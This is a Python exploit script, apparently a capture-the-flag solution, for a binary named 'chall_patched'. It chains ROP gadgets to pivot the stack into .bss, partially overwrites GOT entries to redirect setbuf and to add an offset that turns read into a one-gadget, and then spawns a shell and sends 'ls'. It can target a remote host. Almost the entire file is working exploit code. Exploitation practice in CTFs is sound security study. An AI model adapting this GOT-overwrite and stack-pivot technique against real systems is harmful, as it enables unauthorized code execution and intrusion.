#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from time import sleep

context.log_level = 'debug'
exe = context.binary = ELF('./chall_patched', checksec=False)
libc = exe.libc

gdbscript = '''
init-pwndbg
# init-gef-bata
b *0x4011c0
c
'''

def start(argv=[]):
    if args.LOCAL:
        p = exe.process()
    elif args.REMOTE:
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p

# ==================== EXPLOIT ====================
p = start()

read_gadget = 0x4011A9
leave_ret = 0x4011C0
add_ptr = 0x40113c # add  [rbp-0x3D], ebx ; nop ; ret ;
pop_rbp = 0x40119b
bss = 0x404000 + 0x800

s(flat({
    0x20: [
        exe.got.setbuf + 0x20 + 0x20,
        read_gadget,
    ]
}, filler=b'A'))


sleep(.5)
s(flat({
    0: [
        bss+0x20,
        read_gadget,
    ],
    0x20: [
        exe.got.setbuf + 0x20,
        read_gadget
    ]
}, filler=b'B'))

'''
   0x15555536efaa <__GI_rewind+138>:    pop    rbx
   0x15555536efab <__GI_rewind+139>:    pop    rbp
   0x15555536efac <__GI_rewind+140>:    ret
'''

if args.GDB:
    gdb.attach(p, gdbscript=gdbscript)
    pause()

sleep(.5)
s(p8(0xAA)) # __GI_rewind+138

offset = 0xffff91f2


# first setup the payload for add read@got to onegadget
# this payload will start at bss
sleep(.5)
s(flat(
    exe.plt.setbuf,
    offset,
    exe.got.read + 0x3d,
    add_ptr,
    bss + 0x20 + 0x20, # bss+0x20 - rbp
    read_gadget,       # bss+0x28 - rip
))

sleep(.5)
# start at bss+0x20
# this payload will overwrite 2 values at bss+0x20 and bss+0x28
# which are rbp and rip of the payload above
# at the time we overwrite it the RBP are RBP  0x404840 —▸ 0x4047f8 ◂— 0
# so the (1) leave_ret will help us return to the (2) leave_ret at bss+0x48
s(flat({
    0: [
        exe.plt.read, # add_ptr return will go here
        leave_ret, # (1)
    ],
    0x20: [
        bss-0x8,
        leave_ret # (2) - set rsp to bss
    ]
}, filler=b'\x00'))

sl(b'ls')

interactive()
